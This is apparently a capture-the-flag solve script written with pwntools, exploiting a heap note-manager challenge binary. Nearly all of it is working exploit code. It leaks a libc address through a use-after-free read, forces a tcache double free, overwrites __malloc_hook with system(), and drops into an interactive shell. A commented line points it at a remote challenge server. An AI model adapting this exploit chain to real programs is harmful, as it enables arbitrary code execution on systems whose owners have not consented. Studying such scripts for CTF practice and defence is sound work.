# %%

from pwn import *

# %%


def _menu():
    res = conn.recvuntil(b'choice: ')
    return res


def add_note(index, length):
    print("\nadd_note")
    print(f"{index = }")
    print(f"{length = }")

    _menu()
    conn.sendline(b'1')

    conn.recvuntil(b'Index: ')
    conn.sendline(str(index).encode())

    conn.recvuntil(b'Length: ')
    conn.sendline(str(length).encode())

    conn.recvline()
    return


def read_note(index):
    print("\nread_note")
    print(f"{index = }")

    _menu()
    conn.sendline(b'2')

    conn.recvuntil(b'Index: ')
    conn.sendline(str(index).encode())

    a = conn.recvline()
    print(a)
    a = conn.recvline()
    print(a)
    return a


def write_note(index, content):
    print("\nwrite_note")
    print(f"{index = }")
    print(f"{content = }")

    _menu()
    conn.sendline(b'3')

    conn.recvuntil(b'Index: ')
    conn.sendline(str(index).encode())

    conn.recvuntil(b'Content: ')
    conn.send(str(content).encode())
    return


def delete_note(index):
    print("\ndelete_note")
    print(f"{index = }")

    _menu()
    conn.sendline(b'4')

    conn.recvuntil(b'Index: ')
    conn.sendline(str(index).encode())

    conn.recvline()
    return


# %%

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# conn = remote('10.113.184.121', 10043)
conn = process(['./src/release/share/chal'])

# ./src/release/share/chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e8d5ecec8cad453bd0d240542184c8c86bc3ceb9, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'

_pid = gdb.attach(
    conn,
    gdbscript=gdbscript,
)

# %%

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

add_note(1, 0x418)

add_note(2, 0x18)

# add_note(3, 0x18)
# add_note(4, 0x18)

delete_note(1)  # unsorted bin

a = read_note(1)  # get libc

libc_base = u64(a[:8].ljust(8, b'\x00')) - 0x219ce0
libc_free_hook = libc_base + libc.symbols['__free_hook']
libc_malloc_hook = libc_base + libc.symbols['__malloc_hook']
libc_system = libc_base + libc.symbols['system']

print(f"{hex(libc_base) = }")
print(f"{hex(libc_free_hook) = }")
print(f"{hex(libc_malloc_hook) = }")
print(f"{hex(libc_system) = }")
print()

# %%

# delete_note(2)  # double free
# delete_note(3)
# delete_note(2)

# print("A")

# # payload = b'/bin/sh\x00'.ljust(0x10, b'B')
# # write_note(2, payload)
# write_note(2, p64(libc_free_hook))

# print("B")

# add_note(3, 0x18)
# add_note(3, 0x18)
# add_note(3, 0x18)

# write_note(3, p64(libc_system))

# print("C")

# delete_note(2)

# print("D")

# conn.interactive()

# %%

add_note(3, 0x18)  # tcache 1~7
add_note(4, 0x18)
add_note(5, 0x18)
add_note(6, 0x18)
add_note(7, 0x18)
add_note(8, 0x18)
add_note(9, 0x18)

add_note(10, 0x18)
add_note(11, 0x18)

delete_note(3)  # tcache 1~7
delete_note(4)
delete_note(5)
delete_note(6)
delete_note(7)
delete_note(8)
delete_note(9)

delete_note(10)  # double free
delete_note(11)
delete_note(10)

add_note(3, 0x18)  # tcache 1~7
add_note(4, 0x18)
add_note(5, 0x18)
add_note(6, 0x18)
add_note(7, 0x18)
add_note(8, 0x18)
add_note(9, 0x18)

# # payload = b'/bin/sh\x00'.ljust(0x10, b'\x00')
# payload = b'sh\x00'.ljust(0x10, b'\x00')
# write_note(9, payload)

# conn.interactive()

print("A")

print(f"{hex(libc_base) = }")
print(f"{hex(libc_free_hook) = }")
print(f"{hex(libc_malloc_hook) = }")
print(f"{hex(libc_system) = }")
print()

raw_input()

add_note(10, 0x18)

payload_1 = flat([
    # b'AAAAAAAA',
    # b'AAAAAAAA',
    # libc_free_hook,
    libc_malloc_hook,
    libc_malloc_hook,
    libc_malloc_hook,
])
write_note(10, payload_1)

print("B")

raw_input()

add_note(11, 0x18)
add_note(11, 0x18)
add_note(11, 0x18)

print("C")

# read_note(11)

payload_2 = flat([
    libc_system,
    libc_system,
])
write_note(11, payload_2)

print("D")

delete_note(9)

print("E")

conn.interactive()

# %%
